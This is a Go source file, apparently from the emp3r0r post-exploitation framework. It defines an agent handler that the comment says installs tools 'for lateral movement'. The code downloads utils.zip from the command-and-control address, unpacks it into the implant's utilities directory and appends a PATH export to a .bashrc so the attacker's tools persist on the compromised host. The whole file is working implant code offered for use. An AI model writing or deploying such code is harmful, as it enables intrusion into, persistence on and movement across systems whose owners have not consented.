package agent

/*
install tools to UtilsPath, for lateral movement
*/

import (
	"fmt"
	"log"
	"os"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/mholt/archiver"
)

func vaccineHandler() string {
	log.Printf("Downloading utils.zip from %s", CCAddress+"utils.zip")
	_, err := DownloadViaCC(CCAddress+"www/utils.zip", AgentRoot+"/utils.zip")
	out := "[+] Utils have been successfully installed"
	if err != nil {
		log.Print("Utils error: " + err.Error())
		out = "[-] Download error: " + err.Error()
	}

	// unpack utils.zip to our PATH
	if !util.IsFileExist(UtilsPath) {
		if err = os.MkdirAll(UtilsPath, 0700); err != nil {
			log.Print(err)
			return fmt.Sprintf("mkdir: %v", err)
		}
	}
	if err = archiver.Unarchive(AgentRoot+"/utils.zip", UtilsPath); err != nil {
		log.Printf("Unarchive: %v", err)
		return fmt.Sprintf("Unarchive: %v", err)
	}
	_ = os.Remove(AgentRoot + "/utils.zip")

	// update PATH in .bashrc
	exportPATH := fmt.Sprintf("export PATH=%s:$PATH", UtilsPath)
	if !util.IsStrInFile(exportPATH, UtilsPath+"/.bashrc") {
		err = util.AppendToFile(UtilsPath+"/.bashrc", exportPATH)
		if err != nil {
			log.Printf("Update bashrc: %v", err)
			out = fmt.Sprintf("Update bashrc: %v", err)
		}
	}
	return out
}
